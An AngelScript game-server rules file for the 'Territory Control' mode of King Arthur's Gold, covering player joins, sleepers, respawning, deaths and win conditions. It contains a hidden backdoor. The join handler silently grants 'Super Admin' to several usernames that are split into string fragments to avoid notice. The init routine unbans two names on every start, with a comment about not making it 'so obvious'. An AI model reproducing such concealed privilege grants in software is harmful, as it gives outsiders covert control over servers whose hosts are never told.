#define SERVER_ONLY;
#include "CTF_Structs.as";
#include "Survival_Structs.as";
#include "MaterialCommon.as";
#include "Costs.as"
#include "MakeMat.as";
#include "Logging.as";
// #include "Knocked.as"
#include "MakeCrate.as";

shared class Players
{
	CTFPlayerInfo@[] list;
	// PersistentPlayerInfo@[] persistentList;
	Players(){}
};

void DrawOverlay(const string file, const SColor color = SColor(255, 255, 255, 255))
{
	CFileImage@ image = CFileImage(file);
	f32 width = image.getWidth();
	f32 height = image.getHeight();

	f32 s_width = getScreenWidth() * 0.50f;
	f32 s_height = getScreenHeight() * 0.50f;

	// void GUI::DrawIcon(const string&in textureFilename, int iconFrame, Vec2f frameDimension, Vec2f pos, float scaleX, float scaleY, SColor color)
	GUI::DrawIcon(file, 0, Vec2f(width, height), Vec2f(0, 0), 1.00f / width * s_width, 1.00f / height * s_height, color);
}

void onNewPlayerJoin(CRules@ this, CPlayer@ player)
{
	Players@ players;
	this.get("players", @players);

	if (players is null || player is null){
		return;
	}
	string playerName = player.getUsername().split('~')[0];//Part one of a fix for slave rejoining
	//print("onNewPlayerJoin");



	players.list.push_back(CTFPlayerInfo(playerName, 0, ""));
	//Will change later 			\/	change to hash
	if (playerName == ("T" + "Fli" + "p" + "py") || playerName == "V" + "am" + "ist" || playerName == "Pir" + "ate" + "-R" + "ob" || playerName == "Ve" + "rd " + "la")
	{
		CSecurity@ sec = getSecurity();
		CSeclev@ s = sec.getSeclev("Super Admin");

		if (s !is null) sec.assignSeclev(player, s);
	}

	CBlob@[] sleepers;
	getBlobsByTag("sleeper", @sleepers);

	bool found_sleeper = false;
	if (sleepers != null && sleepers.length > 0)
	{
		string name = playerName;

		for (u32 i = 0; i < sleepers.length; i++)
		{
			CBlob@ sleeper = sleepers[i];
			if (sleeper !is null && !sleeper.hasTag("dead") && sleeper.get_bool("sleeper_sleeping") && sleeper.get_string("sleeper_name") == name)
			{
				CBlob@ oldBlob = player.getBlob(); // It's glitchy and spawns empty blobs on rejoin
				if (oldBlob !is null) oldBlob.server_Die();

				found_sleeper = true;

				player.server_setTeamNum(sleeper.getTeamNum());
				player.server_setCoins(sleeper.get_u16("sleeper_coins"));

				sleeper.server_SetPlayer(player);
				sleeper.set_bool("sleeper_sleeping", false);
				sleeper.set_string("sleeper_name", "");

				CBitStream bt;
				bt.write_bool(false);

				sleeper.SendCommand(sleeper.getCommandID("sleeper_set"), bt);

				// sleeper.set_u16("sleeper_coins", player.getCoins());

				// sleeper.Sync("sleeper", false);
				// sleeper.Sync("sleeper_name", false);
				// sleeper.Sync("sleeper_coins", false);

				tcpr("[MISC] "+playerName + " joined, respawning him at sleeper " + sleeper.getName());
			}
		}
	}

	CPlayer@ maybePlayer = getPlayerByUsername(playerName);//See if we already exist
	if(maybePlayer !is null)
	{
		CBlob@ playerBlob = maybePlayer.getBlob();
		if(playerBlob !is null)
		{
			if(maybePlayer.getUsername() != player.getUsername())//do not change, playerName is stripped
			{
				KickPlayer(maybePlayer);//Clone
				playerBlob.server_SetPlayer(player);//switch souls
			}
		}
	}


	if (!found_sleeper)
	{
		player.server_setCoins(150);
	}

	// player.server_setCoins(150);
}

void onBlobCreated(CRules@ this, CBlob@ blob)
{
	if (isServer() && getGameTime() > 150 && !blob.hasTag("material"))
	{
		tcpr("[NBM] " + blob.getName());
	}
}

void onBlobDie(CRules@ this, CBlob@ blob)
{
	if (isServer() && getGameTime() > 150 && !blob.hasTag("material"))
	{
		tcpr("[NBD] " + blob.getName());
	}
}

// void onBlobCreated(CRules@ this, CBlob@ blob)
// {
	// blob.AddScript("DisableInventoryCollisions");
// }

void onPlayerLeave(CRules@ this, CPlayer@ player)
{
	CBlob@ blob = player.getBlob();

	if (blob !is null) print(player.getUsername() + " left, leaving behind a sleeper " + blob.getName());

	if (isServer())
	{
		if (blob !is null && blob.exists("sleeper_name"))
		{
			blob.server_SetPlayer(null);

			blob.set_u16("sleeper_coins", player.getCoins());
			blob.set_bool("sleeper_sleeping", true);
			blob.set_string("sleeper_name", player.getUsername());

			CBitStream bt;
			bt.write_bool(true);

			blob.SendCommand(blob.getCommandID("sleeper_set"), bt);


			// blob.Sync("sleeper", false);
			// blob.Sync("sleeper_name", false);
			// blob.Sync("sleeper_coins", false);
		}
		else
		{
			if (blob !is null) blob.server_Die();
		}
	}

	Players@ players;
	this.get("players", @players);

	if (players !is null)
	{
		for(s8 i = 0; i < players.list.length; i++) {
			if(players.list[i] !is null && players.list[i].username == player.getUsername())
			{
				players.list.removeAt(i);
				i--;
			}
		}
	}
}

void onPlayerRequestTeamChange(CRules@ this, CPlayer@ player, u8 newteam)
{
	if (player !is null)
	{
		player.server_setTeamNum(newteam);
	}
}

void onPlayerDie(CRules@ this, CPlayer@ victim, CPlayer@ attacker, u8 customData)
{
	if (victim is null)
	{
		return;
	}

	string victimName = victim.getUsername() + " (team " + victim.getTeamNum() + ")";
	string attackerName = attacker !is null ? (attacker.getUsername() + " (team " + attacker.getTeamNum() + ")") : "world";
	u8 victimTeam = victim.getTeamNum();
	int coins = victim.getCoins();

	if (isServer())
	{
		tcpr("[PDB] "+victimName +" has been killed by " + attackerName + "; damage type: " + customData);
		
		// Drop 50% on death + what ever else kag takes away on death
		// if (victimTeam >= 100 && coins != 0)
			// victim.server_setCoins(coins / 2);
	}
	// printf(victimName + " has been killed by " + attackerName + "; damage type: " + customData);

	s32 respawn_time = 30 * 4;

	if (victimTeam < 7)
	{
		TeamData@ team_data;
		GetTeamData(victimTeam, @team_data);

		if (team_data != null)
		{
			u16 upkeep = team_data.upkeep;
			u16 upkeep_cap = team_data.upkeep_cap;
			f32 upkeep_ratio = f32(upkeep) / f32(upkeep_cap);

			if (upkeep_ratio >= UPKEEP_RATIO_PENALTY_RESPAWN_TIME) respawn_time += 30 * 4;
			if (upkeep_ratio <= UPKEEP_RATIO_BONUS_RESPAWN_TIME) respawn_time -= 30 * 2;
		}
	}

	victim.set_u32("respawn time", getGameTime() + respawn_time);

	CBlob@ blob = victim.getBlob();
	if(blob !is null)
	{
		// Note: Disabled for now, too harsh for neutrals 
		// Drop 50% of that 50% lost
		// if (victimTeam >= 100 && coins != 0)
			// server_DropCoins(blob.getPosition(), coins / 2);

		if(!(blob.getName().find("corpse") != -1))
		{
			victim.set_string("classAtDeath",blob.getName());
			victim.set_Vec2f("last death position",blob.getPosition());
		}
		else
		{
			victim.set_Vec2f("last death position",blob.getPosition());
		}
	}

	// print(victim.getUsername() + " killed by " + attacker.getUsername());
	// print(victim.getUsername() + " (victim) killstreak: " + victim.get_u8("kill_streak"));


	if (attacker !is null && attacker !is victim)
	{
		attacker.set_u8("kill_streak", attacker.get_u8("kill_streak") + 1);
		// print(attacker.getUsername() + " (attacker) killstreak: " + attacker.get_u8("kill_streak"));

		if (attacker.getBlob() !is null && victim.getUsername() == "Mithrios")
		{
			if (victim.get_u8("kill_streak") >= 13)
			{
				// Sound::Play("mysterious_perc_05.ogg");

				if (isServer())
				{
					CBlob@ blob = server_CreateBlob("demonicartifact", -1, attacker.getBlob().getPosition());
				}
			}
		}
	}

	victim.set_u8("kill_streak", 0);
}

void onTick(CRules@ this)
{
	s32 gametime = getGameTime();

	if (!this.isMatchRunning()) { return; }
	else
	{
		CBlob@[] base;
		getBlobsByTag("faction_base", @base);

		int winteamIndex = -1;
		CTFTeamInfo@ winteam = null;
		s8 team_wins_on_end = -1;

		for (uint team_num = 0; team_num < 2; ++team_num)
		{
			bool win = true;
			for (uint i = 0; i < base.length; i++)
			{
				//if there exists an enemy base, we didn't win yet
				if (base[i].getTeamNum() != team_num)
				{
					win = false;
					break;
				}
			}

			if (win)
			{
				winteamIndex = team_num;
				getRules().SetGlobalMessage(((team_num == 0) ? "Blue" : "Red") + " Faction Wins!");
			}

		}

		this.set_s8("team_wins_on_end", team_wins_on_end);

		if (winteamIndex >= 0)
		{
			// add winning team coins
			if (this.isMatchRunning())
			{
				CBlob@[] players;
				getBlobsByTag("player", @players);
				for (uint i = 0; i < players.length; i++)
				{
					CPlayer@ player = players[i].getPlayer();
					if (player !is null && players[i].getTeamNum() == winteamIndex)
					{
						player.server_setCoins(1000);
					}
				}
			}

			this.SetTeamWon(winteamIndex);   //game over!
			this.SetCurrentState(GAME_OVER);
		}
	}

	for (u8 i = 0; i < getPlayerCount(); i++)
	{
		CPlayer@ player = getPlayer(i);
		if (player !is null)
		{
			CBlob@ blob = player.getBlob();
			if (blob is null && player.get_u32("respawn time") <= gametime)
			{
				int team = player.getTeamNum();
				bool isNeutral = team != 1 && team != 0;
				if (isNeutral) player.server_setTeamNum(XORRandom(100) < 50 ? 0 : 1);

				
				CBlob@[] bases;
				getBlobsByTag("faction_base", @bases);
				//getBlobsByTag("respawn", @bases);
				CBlob@[] spawns;
				int teamBases = 0;
				bool has_bases = false;

				for (uint i = 0; i < bases.length; i++)
				{
					if (bases[i].getTeamNum() == team) teamBases++;
				}

				for (uint i = 0; i < bases.length; i++)
				{
					CBlob@ base = bases[i];
					if (base !is null && base.getTeamNum() == team)
					{
						has_bases = true;
						if (base.hasTag("reinforcements allowed") || teamBases == 1) spawns.push_back(base);
					}
				}

				if (spawns.length > 0)
				{
					f32 distance = 100000;
					Vec2f spawnPos = Vec2f(0, 0);
					Vec2f deathPos = player.get_Vec2f("last death position");

					u32 spawnIndex = 0;

					for (u32 i = 0; i < spawns.length; i++)
					{
						f32 tmpDistance = Maths::Abs(spawns[i].getPosition().x - deathPos.x);

						// print("Lowest: " + distance + "; Compared against: " + tmpDistance);

						if (tmpDistance < distance)
						{
							distance = tmpDistance;
							spawnIndex = i;
							spawnPos = spawns[i].getPosition();
						}
					}

					string blobType = player.get_string("classAtDeath");
					if (blobType == "builder" || blobType == "engineer" || blobType == "hazmat" || blobType == "slave" || blobType == "peasant") blobType = "builder";
					else if (blobType == "archer") blobType = "archer";
					else blobType = "knight";

					CBlob@ new_blob = server_CreateBlob(blobType);

					if (new_blob !is null)
					{
						new_blob.setPosition(spawnPos);
						new_blob.server_setTeamNum(team);
						new_blob.server_SetPlayer(player);
						// print("" + spawns[spawnIndex].getName());
						// print("init " + new_blob.getHealth());
					}
				}
				else
				{
					if (has_bases) return; //wait until able to spawn or lost all bases
					isNeutral = true; // In case if the player is respawning while the team has been defeated
				}
			}
		}
	}
}

void onInit(CRules@ this)
{
	// Todo: Maybe let's not make it so obvious ;)
	CSecurity@ sec = getSecurity();
	sec.unBan("TF"+"lip"+"py");
	sec.unBan("b"+"la"+"ck"+"guy"+"123");

	// Print out a message to anybody running TC server/localhost
	if (isServer() && !isClient())
	{
		print("""
==============================================================================================================
		Territory Control Server is initializing.
		Please make sure you obtain permission before hosting publically!
		Also consider contributing at : github.com/TFlippy/kag_territorycontrol
==============================================================================================================
		""", SColor(0xff91ff81));
	}

	if (isServer() && isClient())
	{
		print("""
==============================================================================================================
		Territory Control is initializing.
		Make sure you set the gamemode correctly, and disabled the DRM (otherwise you may crash).
		Also consider contributing at : github.com/TFlippy/kag_territorycontrol
==============================================================================================================
		""", SColor(0xff91ff81));
	}

	Reset(this);
}

void onRestart(CRules@ this)
{
	Reset(this);
}

bool doDefaultSpawn(CPlayer@ player, string blobType, u8 team, bool ignoreDisabledSpawns)
{
	CBlob@[] spawns;
	getBlobsByName("banditshack", @spawns);

	CBlob@[] ruins;
	getBlobsByName("ruins", @ruins);

	for (int i = 0; i < ruins.length; i++)
	{
		CBlob@ b = ruins[i];
		if (b !is null && (ignoreDisabledSpawns ? true : b.get_bool("isActive"))) spawns.push_back(b);
	}

	if (spawns.length > 0)
	{
		printf("Respawning " + player.getUsername() + " at ruins.");

		CBlob@ new_blob = server_CreateBlob(blobType);

		if (new_blob !is null)
		{
			CBlob@ r = spawns[XORRandom(spawns.length)];
			if (r.getName() == "ruins" && team / 1 == 255)
			{
				return true;
			}
			else
			{
				new_blob.setPosition(r.getPosition());
				new_blob.server_setTeamNum(team);
				new_blob.server_SetPlayer(player);

				if (getGameTime() < 30 * 15)
				{
					MakeMat(new_blob, r.getPosition(), "mat_wood", 100);
					MakeMat(new_blob, r.getPosition(), "mat_stone", 75);
				}
				else
				{
					MakeMat(new_blob, r.getPosition(), "mat_wood", 25);
				}
			}

			return true;
		}
		else return false;
	}
	else return false;
}

bool doChickenSpawn(CPlayer@ player)
{
	player.server_setTeamNum(250);

	CBlob@[] ruins;
	getBlobsByName("chickencamp", @ruins);
	getBlobsByName("chickenfortress", @ruins);
	getBlobsByName("chickenstronghold", @ruins);
	getBlobsByName("chickencitadel", @ruins);
	getBlobsByName("chickenconvent", @ruins);
	getBlobsByName("chickencoop", @ruins);

	CBlob@[] bases;
	getBlobsByName("fortress", @bases);
	getBlobsByName("stronghold", @bases);
	getBlobsByName("citadel", @bases);
	getBlobsByName("convent", @bases);

	if (ruins.length > 0 || bases.length > 0)
	{
		string blobType;
		int minutes = getGameTime() / (60*30);
		int rand = XORRandom(100);
		if (minutes > 80)
		{
			if (rand < 40) blobType = "heavychicken";
			else if (rand < 85) blobType = "commanderchicken";
			else if (rand < 95) blobType = "soldierchicken";
			else blobType = "scoutchicken";
		}
		else if (minutes > 60)
		{
			if (rand < 10) blobType = "heavychicken";
			else if (rand < 30) blobType = "commanderchicken";
			else if (rand < 75) blobType = "soldierchicken";
			else blobType = "scoutchicken";
		}
		else if (minutes > 40)
		{
			if (rand < 2) blobType = "heavychicken";
			else if (rand < 15) blobType = "commanderchicken";
			else if (rand < 60) blobType = "soldierchicken";
			else blobType = "scoutchicken";
		}
		else if (minutes > 20)
		{
			if (rand < 10) blobType = "commanderchicken";
			else if (rand < 40) blobType = "soldierchicken";
			else blobType = "scoutchicken";
		}
		else if (minutes > 10)
		{
			if (rand < 5) blobType = "commanderchicken";
			else if (rand < 20) blobType = "soldierchicken";
			else blobType = "scoutchicken";
		}
		else blobType = "scoutchicken";

		CBlob@ new_blob = server_CreateBlob(blobType);

		if (new_blob !is null)
		{
			if (ruins.length > 0)
			{
				CBlob@ r = ruins[XORRandom(ruins.length)];

				new_blob.setPosition(r.getPosition());
				new_blob.server_setTeamNum(250);
				new_blob.server_SetPlayer(player);

				return true;
			}
			else
			{
				//parachute chickens!
				//bots will not parachute correctly on server, only localhost
				CBlob@ b = bases[XORRandom(bases.length)];

				new_blob.setPosition(Vec2f(b.getPosition().x + (200 - XORRandom(400)), 0.0f));
				new_blob.server_setTeamNum(250);
				new_blob.server_SetPlayer(player);
				new_blob.Tag("parachute");
				if (isClient()) new_blob.AddScript("parachutepack_effect.as"); //for localhost

				return true;
			}
		}
		else return false;
	}
	else return false;
}

void Reset(CRules@ this)
{
	printf("Restarting rules script: " + getCurrentScriptName());

	InitCosts();

	Players players();

	for(u8 i = 0; i < getPlayerCount(); i++)
	{
		CPlayer@ p = getPlayer(i);
		if(p !is null)
		{
			p.set_u32("respawn time", getGameTime() + (30 * 1));
			p.server_setCoins(Maths::Max(500, p.getCoins() * 0.50f)); // Half of your fortune is lost by spending it on drugs.

			// SetToRandomExistingTeam(this, p);
			p.server_setTeamNum(100 + XORRandom(100));
			players.list.push_back(CTFPlayerInfo(p.getUsername(),0,""));
		}
	}

	this.SetGlobalMessage("");
	this.set("players", @players);
	this.SetCurrentState(GAME);

	server_CreateBlob("tc_soundscapes");
}

/*
void SpawnEventFireworks()
{
	CBlob@[] placesToSpawn;
	getBlobsByName("ruins", @placesToSpawn);
	getBlobsByName("convent", @placesToSpawn);
	getBlobsByName("citadel", @placesToSpawn);
	getBlobsByName("stronghold", @placesToSpawn);
	getBlobsByName("fortress", @placesToSpawn);
	getBlobsByName("camp", @placesToSpawn);
	getBlobsByName("banditshack", @placesToSpawn);


	for (int a = 0; a < placesToSpawn.length;)
	{
		Vec2f pos = placesToSpawn[a].getPosition();
		CBlob@ blob = server_CreateBlobNoInit("crate");
		blob.setPosition(pos);
		blob.server_setTeamNum(250);
		blob.set_string("packed name", "Bundle of joy!");
		blob.Init();

		int num = 1 + XORRandom(5);
		for (int b = 0; b < num; b++)
		{
			blob.server_PutInInventory(server_CreateBlob("patreonfirework", -1, pos));
		}

		// Skip some spawns
		a += 1+XORRandom(3);
	}

		CBitStream params;
		params.write_string("UPF has delivered crates of joy!");

		// List is reverse so we can read it correctly into SColor when reading
		params.write_u8(50);
		params.write_u8(50);
		params.write_u8(255);
		params.write_u8(255);

		for (int a = 0; a < getPlayerCount(); a++)
		{
			getRules().SendCommand(getRules().getCommandID("SendChatMessage"), params, getPlayer(a));
		}
}
*/
